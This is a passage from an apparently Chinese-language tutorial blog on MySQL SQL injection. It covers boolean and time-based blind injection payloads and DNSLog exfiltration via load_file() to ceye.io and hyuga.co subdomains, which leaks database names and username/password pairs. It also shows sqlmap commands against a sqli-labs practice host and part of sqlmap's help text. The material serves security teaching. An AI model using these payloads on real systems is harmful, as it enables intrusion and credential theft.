substr(version(),1,1)&gt;5;</span><br></pre></td></tr></table></figure><p><strong>ASCII</strong></p><p><code>ASCII(s)</code>返回字符串 s 的第一个字符的 ASCII 码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and ascii(user())&gt;113 ;</span><br><span class="line">and ascii(user())&gt;114 ;</span><br><span class="line"></span><br><span class="line">and ascii(mid(user(),1,1))&gt;113 ;</span><br><span class="line">and ascii(mid(user(),1,1))&gt;114 ;</span><br></pre></td></tr></table></figure><p><strong>ORD</strong></p><p><code>ORD()</code>函数返回字符串第一个字符的 ASCII值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid((select username from security.users order by id limit 0,1),1,1))=68</span><br></pre></td></tr></table></figure><p><strong>IF与REGEXP与LIKE</strong></p><p><code>IF(expr,v1,v2)</code>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 判断用户名</span><br><span class="line">and 1=(if((user() regexp &apos;^ro&apos;),1,0));</span><br><span class="line"></span><br><span class="line"># 查表名</span><br><span class="line">and 1=(select 1 from information_schema.tables where table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1);</span><br><span class="line"></span><br><span class="line"># 查列名</span><br><span class="line">and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^us[a-z]&apos; limit 0,1);</span><br><span class="line"></span><br><span class="line"># 查内容</span><br><span class="line">and ord(mid((select username from security.users order by id limit 0,1),1,1))=68</span><br><span class="line">mysql&gt; select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| ifnull(cast(username as char),0x20) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| Dumb                                |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>CAST函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cast(字段名 as 转换的类型 )</span><br></pre></td></tr></table></figure><p><code>CAST()</code>函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一：</p><p><code>BINARY</code>，<code>CHAR</code>，<code>DATE</code>，<code>DATETIME</code>，<code>TIME</code>，<code>DECIMAL</code>，<code>SIGNED</code>，<code>UNSIGNED</code>。</p><p>该函数通常用于返回具有指定类型的值</p><p><strong>IFNULL</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(expr1,expr2)</span><br></pre></td></tr></table></figure><p>如果 expr1 不是NULL，IFNULL() 返回 expr1，否则它返回 expr2</p><h1 id="基于时间类型盲注"><a href="#基于时间类型盲注" class="headerlink" title="基于时间类型盲注"></a>基于时间类型盲注</h1><h2 id="SLEEP-tiem"><a href="#SLEEP-tiem" class="headerlink" title="SLEEP(tiem)"></a>SLEEP(tiem)</h2><p>依然是配合字符串截取函数使用，用来作为延时的条件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前数据库第一位 s 的 ascii 码</span></span><br><span class="line">mysql&gt; select ascii(database());</span><br><span class="line">+-------------------+</span><br><span class="line">| ascii(database()) |</span><br><span class="line">+-------------------+</span><br><span class="line">|               115 |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line">and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))&gt;115,1,sleep(5))</span><br></pre></td></tr></table></figure><p>相当于原来的 and 判断现在直接使用是否触发<code>sleep()</code>函数来判断是否产生了注入。</p><h2 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h2><p>用于基准测试函数的性能，参数一为运算次数数，参数二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。</p><p>这是一种边信道攻击，在运行过程中占用大量的 cpu 资源，而且比较主观。推荐使用 sleep() 函数进行注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=if(ascii(substr(database(),1,1))&gt;115,1,BENCHMARK(10000000000,md5(233)))</span><br></pre></td></tr></table></figure><h1 id="DNSLog外带数据"><a href="#DNSLog外带数据" class="headerlink" title="DNSLog外带数据"></a>DNSLog外带数据</h1><p>DNSLog 在 Web 漏洞利用中已经是老生常谈的问题，简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。</p><h2 id="DNSLog-平台地址"><a href="#DNSLog-平台地址" class="headerlink" title="DNSLog 平台地址"></a>DNSLog 平台地址</h2><h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p><strong>项目地址</strong>：<a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p><p><strong>在线演示地址</strong>：<a href="https://admin.dnslog.link/" target="_blank" rel="noopener">https://admin.dnslog.link/</a> test/123456</p><p><img src="http://qiniuyun.lintstar.top/image-20200510195616110.png" alt="image-20200510195616110"></p><h3 id="ceye"><a href="#ceye" class="headerlink" title="ceye"></a>ceye</h3><p><strong>官网地址</strong>：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p><h3 id="Hyuga"><a href="#Hyuga" class="headerlink" title="Hyuga"></a>Hyuga</h3><p><strong>项目地址</strong>：<a href="https://github.com/Buzz2d0/Hyuga" target="_blank" rel="noopener">https://github.com/Buzz2d0/Hyuga</a></p><p><strong>演示地址</strong>：<a href="http://hyuga.co/" target="_blank" rel="noopener">http://hyuga.co</a></p><h2 id="开启-load-file"><a href="#开启-load-file" class="headerlink" title="开启 load_file()"></a>开启 load_file()</h2><p>因为 dnslog 盲注需要使用 <code>load_file()</code> 函数，所以一般得是高权限用户。sql 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure><p>查看 load_file() 可以读取的磁盘，若不可用，则修改 my.ini 配置文件</p><ul><li>当 secure_file_priv 为 空，表示不对mysqld 的导入|导出做限制，就可以读取磁盘的目录</li><li>当 secure_file_priv 为 C:\，就可以读取C盘的文件</li><li>当 secure_file_priv 为 null，表示限制 mysqld 不允许导入/导出</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%secure%'</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><p>修改<strong>mysql.ini</strong> 文件，在<strong>[mysqld]</strong> 下加入:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span> =</span><br></pre></td></tr></table></figure><p>修改完重启 MySQL 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%secure%'</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><h2 id="详细演示"><a href="#详细演示" class="headerlink" title="详细演示"></a>详细演示</h2><p><strong>查询当前数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hex编码</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">database</span>())),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyuga</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">database</span>())),<span class="string">'.c3ini5.hyuga.co\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这个地方Hex编码的目的就是减少干扰，因为很多事数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的。</p><p><strong>查询第1个表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>查询第1个字段名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>查询单个列的数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(username) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>查询多个列的数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">concat_ws</span>(<span class="string">'~'</span>,username,<span class="keyword">password</span>)) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h1 id="SQLMap基础"><a href="#SQLMap基础" class="headerlink" title="SQLMap基础"></a>SQLMap基础</h1><h2 id="SQLMap-简介"><a href="#SQLMap-简介" class="headerlink" title="SQLMap 简介"></a>SQLMap 简介</h2><p>sqlmap 是一款自动化检测与利用 SQL 注入漏洞的免费开源工具。</p><ul><li>完全支持 <strong>MySQL</strong>，<strong>Oracle</strong>，<strong>PostgresSQL</strong>，<strong>Microsoft SQL Server</strong>，<strong>Microsoft Access</strong>，<strong>IBM DB2</strong>，<strong>SQLite</strong>，<strong>Firebird</strong>，<strong>Sybase</strong>，<strong>SAP MaxDB</strong> 和 <strong>HSQLDB</strong> 数据库管理系统。</li><li>完全支持4种 SQL 注入技术：<strong>布尔型盲注</strong>，<strong>时间型盲注</strong>，<strong>报错型注入</strong>，<strong>UNION 查询注入</strong></li><li>可以测试并利用 <strong>GET</strong> 和 <strong>POST</strong> 参数，HTTP 头中的 <strong>Cookie</strong>，<strong>User-Agent</strong> 和 <strong>Referer</strong> 这些地方出现的 SQL 注入漏洞。也可以指定一个用英文逗号隔开的参数列表进行测试。</li><li><strong>HTTP(S)</strong> 代理支持通过使用验证代理服务器对目标应用发起请求，同时支持 HTTPS 请求</li><li>支持设置<strong>输出信息的详细级别</strong>：共有<strong>七个级别</strong>的详细程度。</li><li>支持从目标 URL 中<strong>解析 HTML 表单</strong>并伪造 HTTP(S) 请求以测试这些表单参数是否存在漏洞。</li><li>…</li></ul><h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><ul><li>官网：<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></li><li>项目地址: <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></li></ul><h2 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h2><p><strong>检测是否存在 SQL 注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span></span><br></pre></td></tr></table></figure><p><strong>查看基本信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前数据库</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --current-user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库 banner 信息</span></span><br><span class="line"> -u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取主机名</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测当前用户是否是高权限用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --is-dba</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --users</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有所有数据库</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><p><strong>查看当前数据库下的表信息</strong></p><p>开关：<code>--count</code></p><p>如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> --tables</span><br></pre></td></tr></table></figure><p><strong>枚举表名下的列信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> -T <span class="string">'users'</span> --columns</span><br></pre></td></tr></table></figure><p><strong>查询 users 表下所有 username和 password 列的字段信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> -T <span class="string">'users'</span> -C <span class="string">'username,password'</span> --dump</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200510213353530.png" alt="image-20200510213353530"></p><h2 id="详细用法"><a href="#详细用法" class="headerlink" title="详细用法"></a>详细用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line">用法：python sqlmap.py [选项]</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -h, --help            显示基本帮助信息并退出</span><br><span class="line">  -hh                   显示高级帮助信息并退出</span><br><span class="line">  --version             显示程序版本信息并退出</span><br><span class="line">  -v VERBOSE            输出信息详细程度级别：0-6（默认为 1）</span><br><span class="line"></span><br><span class="line">  目标：</span><br><span class="line">      至少提供一个以下选项以指定目标</span><br><span class="line"></span><br><span class="line">    -d DIRECT           直接连接数据库</span><br><span class="line">    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）</span><br><span class="line">    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">    -x SITEMAPURL       从远程网站地图（.xml）文件中解析目标</span><br><span class="line">    -m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">    -r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">    -g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">    -c CONFIGFILE       从 INI 配置文件中加载选项</span><br><span class="line"></span><br><span class="line">  请求：</span><br><span class="line">      以下选项可以指定连接目标地址的方式</span><br><span class="line"></span><br><span class="line">    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">    --data=DATA         使用 POST 发送数据串</span><br><span class="line">    --param-del=PARA..  设置参数值分隔符</span><br><span class="line">    --cookie=COOKIE     指定 HTTP Cookie</span><br><span class="line">    --cookie-del=COO..  设置 cookie 分隔符</span><br><span class="line">    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">    --user-agent=AGENT  指定 HTTP User-Agent</span><br><span class="line">    --random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">    --host=HOST         指定 HTTP Host</span><br><span class="line">    --referer=REFERER   指定 HTTP Referer</span><br><span class="line">    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）</span><br><span class="line">    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）</span><br><span class="line">    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">    --auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">    --ignore-code=IG..  忽略 HTTP 错误码（例如：401）</span><br><span class="line">    --ignore-proxy      忽略系统默认代理设置</span><br><span class="line">    --ignore-redirects  忽略重定向尝试</span><br><span class="line">    --ignore-timeouts   忽略连接超时</span><br><span class="line">    --proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">    --proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">    --proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">    --tor               使用 Tor 匿名网络</span><br><span class="line">    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">    --check-tor         检查是否正确使用了 Tor</span><br><span class="line">    --delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">    --retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">    --randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                        有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                        后面的“请求”小节有详细说明）</span><br><span class="line">    --safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">    --safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">    --skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">    --csrf-url=CSRFURL  指定可提取反 CSRF 攻击 token 的 URL</span><br><span class="line">    --force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">    --hpp               使用 HTTP 参数污染攻击</span><br><span class="line">    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）</span><br><span class="line"></span><br><span class="line">  优化：</span><br><span class="line">    以下选项用于优化 sqlmap 性能</span><br><span class="line"></span><br><span class="line">    -o                  开启所有优化开关</span><br><span class="line">    --predict-output    预测常用请求的输出</span><br><span class="line">    --keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">    --null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br><span class="line"></span><br><span class="line">  注入：</span><br><span class="line">    以下选项用于指定要测试的参数，</span><br><span class="line">    提供自定义注入 payloads 和篡改参数的脚本</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">    --skip=SKIP         指定要跳过的参数</span><br><span class="line">    --skip-static       指定跳过非动态参数</span><br><span class="line">    --param-exclude=..  用正则表达式排除参数（例如："ses"）</span><br><span class="line">    --dbms=DBMS         指定 DBMS 类型（例如：MySQL）</span><br><span 